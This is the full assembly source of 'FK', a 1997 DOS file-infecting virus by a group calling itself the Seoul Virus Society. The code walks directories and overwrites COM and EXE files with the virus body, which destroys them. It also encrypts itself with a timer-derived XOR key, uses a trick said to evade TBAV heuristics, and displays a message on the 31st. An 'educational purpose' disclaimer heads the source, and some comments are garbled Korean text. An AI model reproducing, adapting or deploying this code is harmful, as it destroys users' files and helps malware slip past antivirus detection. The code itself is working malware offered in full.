;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;           FK                                \          \     \   \
;                      by MOV / SVS           \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
; Virus Name : FK
; Author     : MOV (Master Of Virus)
; Group      : SVS (Seoul Virus Society)
; Origin     : Corea
; Date       : 1997/10/29
;
; Type : Non-memory resident  COM  Overwriting
;
; !****************************************************************************!
; *                                                                            *
; * ‰w‰¡ !                                                                     *
; *    ·¡ˆõ·e ¤a·¡œá¯a ­¡¯a Å¡—a·¡”a. Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡Ðe”a.      *
; *    ¹A¸b¸a“e ·¡ ­¡¯aÅ¡—a¡ ´¡‹¡–A“e ´á˜áÐe ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g   *
; *    “e”a. ¥eÑw Ðaˆáa ¯©Ð—Ða»¡  aœa !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
;  ¥¥ ¤a·¡œá¯a“e ¬á¶‰¤a·¡œá¯aµeÐs SVS (Seoul Virus Society) · ¬¡¶… ¡Q¤á·¥ MOV
;  (Master Of Virus)ˆa ¹A¸bÐe FK ¤a·¡œá¯a· ­¡¯a·¡”a. ¹A¸b¸a· ¶¥¥¥ ­¡¯a¡ Â¸÷
;  –E”a.
;
;  TBAV µA ”Ð Anti-heuristic žË¥·¡ —i´á·¶”a. TBAV ¡ »¥”eÐ–·i˜ '#' Îa¯¡ˆa
;  aÈaa»¡ ´g“e”a.
;
;  Š‚µA•¡ TBAV ¬a¶w¸aˆa  g·e ¸ñ·i ¬—ˆbÐa¡e á ¹½·e ¤w¤ó·¡”a.
;
;  µaœáˆa»¡ ¤a·¡œá¯a ­¡¯aŸi Ñ¥ÐsÐe —uÐe ·¥¬w·¡ —e”a.
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

virus     segment para 'virus'
          assume  cs:virus,ds:virus

          org 100h

start:    nop
          jmp vstart                    ; ¤a·¡œá¯a ¯¡¸b
msg:    
szolddir  db '\'                        ;
sdta      db 64 dup (?)                 ; ¤áÌá
szall     db '*.*',0                    ; ¡¡—e Ìa·© Àx‹¡
szrtdir   db '\',0                      ;
szptdir   db '..',0                     ; ¬w¶á ·¡•·
dir_buff  db 64 dup (?)                 ; ¤áÌá
comfiles  db '*.c?m',0                  ; COM Ìa·© Àx‹¡
exefiles  db '*.e?e',0                  ; EXE Ìa·© Àx‹¡
pdirlevel dw offset sdirlevel           ;
sdirlevel db 40h dup (1)                ;
pcurfile  dw ?                          ;

bmsg      db 'Incorrect DOS version',0ah,0dh,'$'

vmsg      db '(c) Copyleft 1997 10.29 by SVS/COREA',0ah,0dh
          db '[F.K Virus].MOV(Master Of Virus)',0ah,0dh,'$'
msge:
vstart:   call plp                          ; Anti-herusitic
          call pass                         ; ´qÑ¡ÑÁ
          mov ax,5700h                      ; µá ????????????
          int 21h                           ; bug ?
          push cx                           ;
          push dx                           ;
          xor ax,ax
          mov es,ax
          mov al,byte ptr es:[046ch]        ; ´qÑ¡ Ç¡ˆt ´è‹¡
          push cs
          pop es
          mov key,al                        ;
          jmp daad
DAAD:             
          mov ah,4eh                        ; EXE Ìa·© Àx‹¡ (E?E)
          mov dx,offset exefiles
          int 21h
          jmp adca

plp:      cmp al,100                        ;
          je  reee                          ; TBAV '#' flag ¢bÑÁ
          inc al                            ;
          loop plp                          ;
reee:     ret                               ;

ADCA:     jc  axc                           ; Àx‹¡ ¯©Ì ?

          mov ax,4301h                      ; ·ª‹¡/³a‹¡¡ ­¢¬÷ ¥e‰w
          xor cx,cx
          mov dx,80h+1eh
          int 21h
          mov ax,3d02h                      ; Ìa·© µ¡Ïe
          int 21h
          xchg bx,ax
          call pass                         ; ´qÑ¡ÑÁ
          mov ah,40h                        ; ¤a·¡œá¯a ³a‹¡
          mov dx,100h
          mov cx,offset endd - 100h
          int 21h
          call pass                         ; ´qÑ¡ Ð¹A

AXC:      mov ah,2ah
          int 21h
          cmp dl,31                         ; 31 ·© ?
          je  vmsgg
          jmp dabb
vmsgg:    mov ah,9                          ; ¬a¶w¸aŸi ­¢·¡‹¡ ¶áÐe ¡A¯¡»¡ Â‰b
          mov dx,offset vmsg                ;
          int 21h                           ;
          call pass
          call pass
          int 20h                           ; ¤a·¡œá¯a ¹·ža

DABB:     xor ax,ax                         ; DTA ¬é¸÷
          xor bx,bx
          xor cx,cx
          xor dx,dx
          mov ah,1ah
          mov dx,offset sdta
          int 21h

DDD:      mov ah,47h                        ;
          mov dl,0
          mov si,offset dir_buff
          int 21h

          mov ah,3bh                        ; —¡BÉ¡Ÿ¡ ·¡•·
          mov dx,offset szrtdir
          int 21h
          jmp find1st

find1st:  mov ah,4eh                        ; COM Ìa·© Àx‹¡
DA:       mov cx,0
          mov dx,offset comfiles
          int 21h
          jc chdir
          mov pcurfile, offset sdta + 1eh
          mov dx,pcurfile
          call vir                          ;
          jc   exitcf
          jmp findnext

findnext: 
          mov ah,4fh                        ; ”a·q Ìa·© Àx‹¡
          jmp da

chdir:    mov si,pdirlevel
finddir:  xor bl,bl
          mov ah,4eh
          mov cx,10010b
          mov dx,offset szall
          int 21h
          jc chkrtdir
          jmp chkdir

findnext2:
          ret

nextdir:  mov ah,4fh
          int 21h
          jc chkrtdir
chkdir:   cmp byte ptr sdta[15h], 10000b    ; —¡BÉ¡Ÿ¡ ·¥»¡ ˆñ¬a
          jz lscurdir
          cmp byte ptr sdta[15h], 10010b
          jnz nextdir
lscurdir: cmp byte ptr sdta[1eh], '.'       ; .. ·¥ˆa ?
          jz nextdir
          inc bl
          cmp bl,[si]
          jnz nextdir

          mov ah,3bh                        ; Ð”w —¡BÉ¡Ÿ¡¡ ·¡•·
          mov dx,offset sdta + 1eh
          int 21h
          inc byte ptr [si]
          inc si
          mov pdirlevel, si
          jmp find1st

chkrtdir: cmp si,offset sdirlevel
          je exitcf
          mov ah,3bh
          mov dx,offset szptdir
          int 21h
          mov byte ptr [si], 1
          dec si
          jmp finddir

exitcf:   mov ah,3bh
          mov dx,offset szptdir
          int 21h
          mov ah,3bh
          mov dx,offset dir_buff
          int 21h
          mov ah,9
          mov dx,offset bmsg
          int 21h
          int 20h

pass:     mov si,offset msg             ; ´qÑ¡ÑÁ žË¥
          mov di,si
          mov ah,key
          mov cx,offset msge - msg
ploop:    lodsb
          xor al,ah
          stosb
          loop ploop
          ret
          
key       db ?                          ; Ç¡ ˆt
vir:      
          push dx
          mov ax,4301h
          xor cx,cx
          mov dx,offset sdta + 1eh
          int 21h
          mov ax,3d02h
          int 21h
          xchg bx,ax
          call pass
          mov ah,40h
          mov dx,100h
          mov cx,offset endd - 100h
          int 21h
          call pass
          pop dx
          ret

ENDD:

 virus    ends
          end start
